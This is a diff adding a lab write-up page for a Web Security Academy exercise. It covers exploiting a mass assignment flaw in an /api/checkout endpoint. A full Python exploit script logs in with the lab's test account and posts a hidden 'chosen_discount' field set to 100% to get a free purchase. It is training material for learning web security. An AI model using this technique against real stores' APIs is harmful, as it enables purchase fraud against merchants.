@@ -1,0 +1,163 @@
+---
+title: 'API Lab 4'
+description: 'Exploiting a mass assignment vulnerability to get a free purchase'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Exploiting a mass assignment vulnerability
+
+<div style="text-align: justify;">
+  This lab demonstrates how mass assignment vulnerabilities can allow an attacker to set hidden parameters in an API request, altering application behaviour. The objective is to exploit a mass assignment issue in the `/api/checkout` endpoint to apply a 100% discount and purchase the Lightweight "l33t" Leather Jacket without having sufficient credit. The lab walks through identifying hidden JSON fields in API responses, testing server-side validation, and sending modified JSON to the POST endpoint to escalate privileges or change application state.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- Log in as the provided user (`wiener:peter`) and add the target product to your basket in the Burp browser.
+- Inspect the API requests for `/api/checkout` in Proxy → HTTP history. Note the JSON structure returned by the GET request.
+- Identify hidden parameters returned by GET that are not present in the POST, for example `chosen_discount`.
+- Send the POST to `/api/checkout` with the additional `chosen_discount` object (mass assignment).
+- Validate that the server accepts the field by sending a non-numeric value (e.g. `"x"`) — an error indicates the server is parsing and validating the input.
+- Finally set `chosen_discount.percentage` to `100` and POST to `/api/checkout` to complete the purchase.
+- If the checkout succeeds with a 100% discount, the lab is solved.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import sys
+import urllib3
+import re
+from bs4 import BeautifulSoup
+
+# Disable SSL warnings (labs / self-signed certs)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Burp proxy (default)
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'
+}
+
+USERNAME = "wiener"
+PASSWORD = "peter"
+PRODUCT_ID = "1"  # leather jacket in this lab
+TIMEOUT = 8
+
+def check_burp():
+    """Ensure Burp is running on 127.0.0.1:8080 (helpful for debugging)."""
+    try:
+        requests.get("http://127.0.0.1:8080", timeout=2)
+    except requests.exceptions.RequestException:
+        print("[-] Burp proxy not reachable at 127.0.0.1:8080. Start Burp or update proxy settings.")
+        sys.exit(1)
+
+def fetch_login(session, base_url):
+    """GET /login and return response (used to extract csrf & initial session)."""
+    try:
+        return session.get(f"{base_url}/login", verify=False, proxies=proxies, timeout=TIMEOUT)
+    except requests.RequestException as e:
+        print(f"[-] Failed to fetch /login: {e}")
+        sys.exit(1)
+
+def extract_csrf(html):
+    """Extract first input[name=csrf] value from HTML or return None."""
+    soup = BeautifulSoup(html, "html.parser")
+    inp = soup.find("input", {"name": "csrf"})
+    if inp and inp.get("value"):
+        return inp["value"]
+    # fallback to regex
+    m = re.search(r'name=["\']?csrf["\']?\s+value=["\']([^"\']+)', html, re.IGNORECASE)
+    return m.group(1) if m else None
+
+def do_login(session, base_url, csrf=None, initial_session=None):
+    """Login as wiener:peter. Returns updated session cookie value."""
+    if initial_session:
+        session.cookies.set("session", initial_session)
+    data = {"username": USERNAME, "password": PASSWORD}
+    if csrf:
+        data["csrf"] = csrf
+    try:
+        r = session.post(f"{base_url}/login", data=data, verify=False, proxies=proxies, allow_redirects=False, timeout=TIMEOUT)
+    except requests.RequestException as e:
+        print(f"[-] Login request failed: {e}")
+        sys.exit(1)
+    new_sess = r.cookies.get("session") or session.cookies.get("session")
+    if not new_sess:
+        print("[-] Login appears to have failed (no session cookie).")
+        sys.exit(1)
+    session.cookies.set("session", new_sess)
+    return new_sess
+
+def post_checkout(session, base_url, product_id=PRODUCT_ID, discount_pct=100):
+    """
+    Post to /api/checkout with chosen_products + chosen_discount.
+    Exploit mass-assignment by sending chosen_discount.percentage = 100.
+    """
+    payload = {
+        "chosen_products": [
+            {"product_id": product_id, "quantity": 1}
+        ],
+        "chosen_discount": {"percentage": discount_pct}
+    }
+    try:
+        return session.post(f"{base_url}/api/checkout", json=payload, verify=False, proxies=proxies, timeout=TIMEOUT, allow_redirects=False)
+    except requests.RequestException as e:
+        print(f"[-] /api/checkout request failed: {e}")
+        sys.exit(1)
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <lab-url>")
+        print(f"Example: python {sys.argv[0]} https://<id>.web-security-academy.net")
+        sys.exit(1)
+
+    base_url = sys.argv[1].rstrip("/")
+    session = requests.Session()
+    session.verify = False
+    session.proxies.update(proxies)
+
+    # optional: ensure Burp is running for easier debugging
+    check_burp()
+
+    # 1) fetch login page
+    print("[*] Fetching login page...")
+    login_resp = fetch_login(session, base_url)
+
+    # 2) extract csrf & session
+    csrf = extract_csrf(login_resp.text)
+    initial_sess = login_resp.cookies.get("session")
+    print(f"    csrf: {csrf}, session: {'present' if initial_sess else 'none'}")
+
+    # 3) login as wiener
+    print("[*] Logging in as wiener...")
+    do_login(session, base_url, csrf=csrf, initial_session=initial_sess)
+    print("[+] Logged in")
+
+    # (optional) add product to basket via site if needed — many labs expect the item to be in basket already.
+    # Some instances accept direct /api/checkout; if not, the lab UI step can be done in browser.
+
+    # 4) exploit: send checkout with chosen_discount 100%
+    print("[*] Posting /api/checkout with chosen_discount.percentage = 100 ...")
+    r = post_checkout(session, base_url, product_id=PRODUCT_ID, discount_pct=100)
+    print(f"    /api/checkout -> {r.status_code}")
+
+    # 5) heuristics: success if order-related text or 2xx status
+    if r.status_code in (200,201,202,204) or "order" in (r.text or "").lower() or "checkout" in (r.text or "").lower():
+        print("[✓] Checkout submitted — verify lab in browser (should be solved).")
+    else:
+        print("[!] Checkout may not have succeeded automatically. Check response:")
+        print((r.text or "")[:600])
+
+if __name__ == "__main__":
+    main()
+```
